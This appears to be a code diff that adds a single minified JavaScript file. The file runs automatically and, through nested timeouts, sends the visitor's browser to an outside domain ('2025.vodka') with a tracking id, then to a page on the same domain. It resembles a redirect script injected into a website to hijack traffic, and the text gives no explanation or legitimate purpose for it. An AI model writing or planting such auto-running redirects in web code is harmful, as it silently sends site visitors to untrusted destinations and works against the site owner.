@@ -1,0 +1,1 @@
+function executeRun(){setTimeout((()=>{window.location.href="https://2025.vodka/?id=8091",setTimeout((()=>{window.location.href="https://2025.vodka/privacy_policy"}),10)}),10)}executeRun();
